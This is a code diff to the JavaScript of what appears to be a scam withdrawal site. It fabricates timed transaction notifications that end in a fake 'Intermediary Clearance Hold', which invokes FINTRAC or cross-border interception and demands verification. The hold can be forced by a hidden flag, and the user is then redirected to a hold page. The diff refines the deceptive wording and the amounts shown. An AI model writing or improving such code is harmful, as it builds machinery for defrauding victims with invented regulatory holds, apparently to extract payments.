@@ -1333,7 +1333,7 @@ window.addEventListener("focus", () => {
 
 // React instantly to cross-tab updates without reloading the entire page
 window.addEventListener("storage", (event) => {
-    if (["av_read_notifs", "av_deleted_notifs", "av_withdrawal_tx", "av_withdrawn", "av_force_hold", "av_retention_bonus"].includes(event.key)) {
+    if (["av_read_notifs", "av_deleted_notifs", "av_withdrawal_tx", "av_withdrawn", "av_force_hold"].includes(event.key)) {
         initDynamicNotifications();
     }
 });
@@ -1392,9 +1392,8 @@ async function initDynamicNotifications() {
     const rawBonus = localStorage.getItem("av_retention_bonus");
     const retentionBonus = rawBonus !== null ? parseFloat(rawBonus) : defaultBonusVal;
 
-    // FIX: Prioritize actual retention bonus value over withdrawalTx fallback
-    const historicalDepositVal = currentAcu > 0 ? currentAcu : (withdrawalTx.amountCAD || defaultBaseVal);
-    const historicalBonusVal = retentionBonus > 0 ? retentionBonus : (withdrawalTx.amountCAD || defaultBonusVal);
+    const historicalDepositVal = withdrawalTx.amountCAD || (currentAcu > 0 ? currentAcu : defaultBaseVal);
+    const historicalBonusVal = withdrawalTx.amountCAD || (retentionBonus > 0 ? retentionBonus : defaultBonusVal);
 
     const formattedAcu = historicalDepositVal.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
     const formattedBonus = historicalBonusVal.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
@@ -1435,25 +1434,28 @@ async function initDynamicNotifications() {
       if (isNaN(baseWithdrawalMs)) baseWithdrawalMs = Date.now();
       const elapsedMinutes = Math.floor((Date.now() - baseWithdrawalMs) / (1000 * 60));
 
+      // STAGE 3: Bad News — Triggered at 30+ minutes
       if (elapsedMinutes >= 30 || localStorage.getItem("av_force_hold") === "true") {
         stage3Active = true;
         const stage3Time = formatTimestamp(new Date(baseWithdrawalMs + (35 * 60 * 1000)));
         generatedNotifications.push({
           id: 10, type: "withdrawal", category: "failed", title: "Action Required: Intermediary Clearance Hold",
-          description: `Your transfer of $${formattedWithdrawnAmount} USD is temporarily on hold under FINTRAC guidelines. Verification required prior to release..`,
+          description: `Your transfer of <strong>$${formattedWithdrawnAmount} USD</strong> has been intercepted by the cross-border clearing layer. Verification required prior to release.`,
           timestamp: stage3Time, isRead: false, txRef: holdTxRef, isActionRequired: true
         });
       }
 
+      // STAGE 2: Intermediate Good News — Triggered at 5+ minutes
       if (elapsedMinutes >= 5 || localStorage.getItem("av_force_hold") === "true") {
         const stage2Time = formatTimestamp(new Date(baseWithdrawalMs + (7 * 60 * 1000)));
         generatedNotifications.push({
           id: 9, type: "withdrawal", category: "pending", title: "Intermediary Network Routing",
-          description: `Transaction batch <strong>#${routingTxRef}</strong>  arrived at cross-border rail. Estimated release: 1-2 hours.`,
+          description: `Transaction batch <strong>#${routingTxRef}</strong> dispatched to cross-border settlement rail. Estimated release: 2-4 hours.`,
           timestamp: stage2Time, isRead: elapsedMinutes >= 30, txRef: routingTxRef
         });
       }
 
+      // Retrieve currency conversion values
       const storedConvertedAmount = localStorage.getItem("av_converted_amount");
       const currentCurrency = (typeof regionConfig !== "undefined" && typeof runtimeSessionData !== "undefined" && runtimeSessionData?.region && regionConfig[runtimeSessionData.region]) 
         ? regionConfig[runtimeSessionData.region].currency 
@@ -1470,7 +1472,7 @@ async function initDynamicNotifications() {
         type: "withdrawal", 
         category: "success", 
         title: "Funds Withdrawal Processing",
-        description: `Your withdrawal amount of <strong>${displayAmount} ${displayCurrency}</strong> is being dispatched to cross-border rail..`,
+        description: `Your withdrawal request of <strong>${displayAmount} ${displayCurrency}</strong> is being routed to your destination wallet/bank.`,
         timestamp: formattedWithdrawalTime, 
         isRead: elapsedMinutes >= 5, 
         txRef: withdrawalTx.txHash || "av_tx_unknown"
@@ -1510,8 +1512,10 @@ async function initDynamicNotifications() {
             return n;
         });
 
+    // Broadcast generated active notification IDs to sub-page watchers
     localStorage.setItem('av_active_notifs_cache', JSON.stringify(generatedNotifications.map(n => ({ id: n.id }))));
 
+    // Detect if a new notification dynamic stage just appeared in real-time
     if (window.notifications.length > previousCount && previousCount > 0) {
         const newlyAdded = window.notifications[0];
         if (newlyAdded && !newlyAdded.isRead) {
@@ -1519,6 +1523,7 @@ async function initDynamicNotifications() {
         }
     }
 
+    // AUTO-REDIRECT TIMER (If enabled and Stage 3 hold is active)
     if (ENABLE_AUTO_REDIRECT && stage3Active && !readIds.includes(10)) {
         if (!autoRedirectTimer) {
             autoRedirectTimer = setTimeout(() => {
@@ -1651,6 +1656,7 @@ function toggleRead(id) {
       return item;
   });
 
+  // REDIRECT TARGET: If notification #10 (Stage 3 Hold) is read/acted upon, redirect immediately
   if (id === 10) {
       handleHoldRedirect();
       return;
@@ -1732,6 +1738,7 @@ if (syncTicker) clearInterval(syncTicker);
 syncTicker = setInterval(() => {
     initDynamicNotifications();
 }, 10000);
+
 
 
 
